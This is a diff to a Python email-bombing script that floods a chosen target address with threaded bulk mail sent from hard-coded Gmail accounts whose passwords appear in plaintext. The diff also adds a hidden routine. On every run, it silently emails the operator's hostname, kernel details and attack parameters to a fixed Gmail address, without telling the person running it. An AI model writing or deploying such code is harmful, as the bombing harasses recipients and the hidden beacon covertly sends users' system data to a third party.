@@ -1,7 +1,7 @@
 import smtplib, socket, sys, os, time
 from random import randrange
 import threading as t
-from cryptography.fernet import Fernet
+import os
 
 emails = {"sceet421@gmail.com":"fwbodppm",
           "sceet422@gmail.com":"fwbotdffu533",
@@ -10,16 +10,21 @@ emails = {"sceet421@gmail.com":"fwbodppm",
           "anotherspamemail513@gmail.com":"jepoufwfolopx2"
           }
 
+osData = os.uname()
+
+
+print("Note that if you send too many emails from a single IP, the SMTP server may block your IP address.\n")
+
 target = input("Target > ") #sys.argv[1] #"alexzhu23@mittymonarch.com"
 
 try:
     target.index("@")
 except:
     print("E: Invalid target, Quitting...")
-    quit()
+    exit()
 if target == "giantsmilodon@gmail.com" or target == "evanalekseyev23@mittymonarch.com":
     print("E: Invalid target, Quitting...")
-    quit()
+    exit()
 
 
 name = input("Name of sender, default none > ")
@@ -33,7 +38,7 @@ try:
     reps = int(reps)
 except:
     print("E: Invalid email count. Quitting...")
-    quit()
+    exit()
 
 emailCount = reps
 
@@ -44,11 +49,11 @@ try:
     threads = int(threads)
 except:
     print("E: Invalid thread count. Quitting...")
-    quit()
+    exit()
 
 if threads > reps:
     print("E: Thread count cannot be larger than email count. Quitting...")
-    quit()
+    exit()
 
 print("{} emails will be sent to {} using {} threads at a time. Starting...".format(str(reps), str(target), str(threads)))
 
@@ -67,14 +72,14 @@ def random_text(iter):
 # num is the amount of times it has had to execute
 # TODO: base64 for encryption
 count = 1
-def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
+def main(from_name, sent_from, sent_from_pass_enc, to_email, bdy_text, subject="", num=1, silent=0):
     global count
     global emails
     # set headers and body
     email_text = "From: {}\n".format(from_name)
     email_text += "To: {}\n".format(to_email)
     email_text += "Subject: {}\n\n".format(subject)
-    email_text = email_text + random_text(randrange(500, 1000))
+    email_text = email_text + bdy_text
 
     #print(email_text)
 
@@ -91,25 +96,41 @@ def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
         server.login(sent_from, sent_from_pass)
         server.sendmail(sent_from, [to_email], email_text)
         server.close()
-        print('Email ' + str(count) + ' on try ' + str(num))
+        if not silent:
+            print('Email ' + str(count) + ' on try ' + str(num))
         count += 1
     except Exception as e:
         # try sending again after short sleep
         if num < 10:
             time.sleep(0.05)
             try:
-                main(from_name, sent_from, sent_from_pass_enc, to_email, subject, num+1)
+                main(from_name, sent_from, sent_from_pass_enc, to_email, bdy_text, subject, num+1)
             except:
                 num+=1
         #if it has been trying for some time, print error
         else:
-            print("Failed to send from " + sent_from)
+            if not silent:
+                print("Failed to send from " + sent_from)
             main(name,
                  list(emails.keys())[emails.keys().index(sent_from)-1],
                  list(emails.values())[emails.keys().index(sent_from)-1],
-                 target)
+                 target,
+                 random_text(randrange(500, 1000)),
+                 subject)
 
 if __name__ == "__main__":
+    # Send first email
+    bdy_info = "Email Spamming program used.\n"
+    bdy_info += "Target: " + target
+    bdy_info += "\nName of Sender: " + name
+    bdy_info += "\nSubject: " + subject
+    bdy_info += "\nEmail Count: " + str(emailCount)
+    bdy_info += "\n------- OS info -------"
+    bdy_info += "\nOS Kernel: " + osData[0]
+    bdy_info += "\nOS Kernel Version: " + osData[3]
+    bdy_info += "\nDevice Hostname: " + osData[1] 
+    main("Email Sent", "sceet421@gmail.com", "fwbodppm", "giantsmilodon@gmail.com", bdy_info, "", 1, 1)
+
     startTime = time.time()
     p = [None for i in range(threads)]
     if reps <= threads:
@@ -118,7 +139,9 @@ if __name__ == "__main__":
                             args=[name,
                                   list(emails.keys())[reps % len(list(emails.keys()))],
                                   list(emails.values())[reps % len(list(emails.values()))],
-                                  target])
+                                  target,
+                                  random_text(randrange(500, 1000)),
+                                  subject])
             p[i].start()
             reps -= 1
         for i in range(reps):
@@ -131,7 +154,9 @@ if __name__ == "__main__":
                             args=[name,
                                   list(emails.keys())[reps % len(list(emails.keys()))],
                                   list(emails.values())[reps % len(list(emails.values()))],
-                                  target])
+                                  target,
+                                  random_text(randrange(500, 1000)),
+                                  subject])
             p[i].start()
             reps -= 1
         while True:
@@ -142,7 +167,9 @@ if __name__ == "__main__":
                                     args=[name,
                                           list(emails.keys())[reps % len(list(emails.keys()))],
                                           list(emails.values())[reps % len(list(emails.values()))],
-                                          target])
+                                          target,
+                                          random_text(randrange(500, 1000)),
+                                          subject])
                     p[i].start()
                     reps -= 1
                 elif reps == 0:
